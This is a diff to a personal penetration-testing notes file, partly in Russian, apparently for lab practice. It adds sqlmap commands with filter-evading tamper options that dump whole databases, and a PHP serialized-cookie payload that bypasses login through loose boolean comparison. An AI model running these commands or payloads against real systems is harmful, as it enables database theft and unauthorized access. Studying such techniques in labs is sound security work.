@@ -2,3 +2,19 @@ Notes
 https://chatgptchatapp.com/
 https://chatgptdemo.net/
 https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html - Chisel Usage
+
+Payloads
+sqlmap -r /home/kali/Desktop/req.txt --batch --delay=0.3 -p expyear --exclude-sysdb --dump-all --random-agent --no-cast --dbms='MySQL' --tamper=randomcase.py,space2comment.py -v3
+
+sqlmap -u "http://1.1.1.1/sql_lab/autumn?id=1" --current-db --batch --delay=0.3 --cookie='PHPSESSID=926fec1d5838dd2b981a998bb4b46828; session=eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2Vyc0xvZ2dlZCI6InNlZHlraCJ9.ZYFa5w.iey4la8yD3_ORwtflTcd5qhbJro' --no-cast
+--dump-all --exclude-sysdb Выгрузить всё
+--flush-session Очистить сессию
+Папка темперов /usr/share/sqlmap/tamper/
+
+Сериализация:
+Допустим, приложение обрабатывает заголовок Cookie вида auth=a:2:{s:5:"login"%3bs:10:"validLogin"%3bs:6:"passwd"%3bs:11:"validPasswd"%3b}
+Таким образом если мы отправим в заголовке Cookie auth=a:2:{s:5:"login"%3bb:1%3bs:6:"passwd"%3bb:1%3b} - приложение все еще нас пропустит. 
+Это произошло потому, что вместостроковых значений "validLogin" и "validPasswd" было отправленологическое значение 1, которое в программировании считается True. 
+В итоге внутри приложения выполнилось логическое равенство $data['login'] == True && $data['passwd'] == True, что и дало доступ. 
+А выполнилось оно потому, что в программировании считается 0 - это False, а любое отличное от 0 - это True. 
+И если сравнивать логическое True с непустой строкой, то получаем истину
